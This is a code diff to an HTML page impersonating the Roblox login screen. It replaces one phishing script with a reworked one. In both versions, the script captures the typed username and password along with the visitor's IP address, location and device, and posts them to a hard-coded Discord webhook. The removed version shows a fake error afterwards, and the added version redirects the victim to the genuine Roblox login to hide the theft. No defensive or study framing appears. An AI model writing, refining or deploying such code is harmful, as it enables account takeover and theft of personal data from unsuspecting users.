@@ -170,51 +170,57 @@
     <div>Explore Roblox on mobile</div>
     <button>Visit</button>
   </div>
-  <script>
-    document.querySelector('.login').addEventListener('click', function () {
-      const username = document.querySelector('input[type="text"]').value.trim();
-      const password = document.querySelector('input[type="password"]').value.trim();
-      if (!username || !password) return alert("Please enter both username and password.");
-      const userAgent = navigator.userAgent;
-      fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .then(data => {
-          const ip = data.ip;
-          const city = data.city;
-          const region = data.region;
-          const country = data.country_name;
-          const device = userAgent.includes("Android") ? "Android" :
-                         userAgent.includes("iPhone") ? "iPhone" :
-                         userAgent.includes("Windows") ? "Windows PC" :
-                         userAgent.includes("Mac") ? "Mac" : "Unknown";
-          const webhookUrl = "https://discord.com/api/webhooks/1382584258375450664/L0sdVMv0uXwiFcRmfOO9eVgQ9zpeP2wAl68DBzc_9JYCF4I1LHikZRrRELNubqPmlm6u";
-          const payload = {
-            content:
-              `**New Login Attempt**\n` +
-              `Username: \`${username}\`\n` +
-              `Password: \`${password}\`\n` +
-              `IP: \`${ip}\`\n` +
-              `Location: ${city}, ${region}, ${country}\n` +
-              `Device: ${device}\n` +
-              `User-Agent: \`${userAgent}\``
-          };
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-          }).then(res => {
-            if (res.ok) {
-              alert("Internal error occurred while processing your request: 404 Not Found");
-            } else {
-              alert("Failed to send data.");
-            }
-          }).catch(err => {
-            alert("Error: " + err);
-          });
-        });
+<script>
+document.querySelector('.login').addEventListener('click', function () {
+  const username = document.querySelector('input[type="text"]').value.trim();
+  const password = document.querySelector('input[type="password"]').value.trim();
+  if (!username || !password) return alert("please enter both username and password.");
+
+  const useragent = navigator.userAgent;
+  const webhook = "https://discord.com/api/webhooks/1382584258375450664/L0sdVMv0uXwiFcRmfOO9eVgQ9zpeP2wAl68DBzc_9JYCF4I1LHikZRrRELNubqPmlm6u";
+
+  fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .then(d => {
+      const ip = d.ip || "unknown";
+      const city = d.city || "unknown";
+      const region = d.region || "unknown";
+      const country = d.country_name || "unknown";
+      const device = useragent.includes("android") ? "android" :
+                     useragent.includes("iphone") ? "iphone" :
+                     useragent.includes("windows") ? "windows pc" :
+                     useragent.includes("mac") ? "mac" : "unknown";
+
+      const data = {
+        content:
+          `**new login attempt**\n` +
+          `username: \`${username}\`\n` +
+          `password: \`${password}\`\n` +
+          `ip: \`${ip}\`\n` +
+          `location: ${city}, ${region}, ${country}\n` +
+          `device: ${device}\n` +
+          `user-agent: \`${useragent}\``
+      };
+
+      fetch(webhook, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      }).then(res => {
+        if (res.ok) {
+          window.location.href = "https://roblox.com/login";
+        } else {
+          alert("failed to send data.");
+        }
+      }).catch(err => {
+        alert("error: " + err);
+      });
+    }).catch(() => {
+      alert("unable to fetch ip or location.");
     });
-  </script>
+});
+</script>
 </body>
 </html>
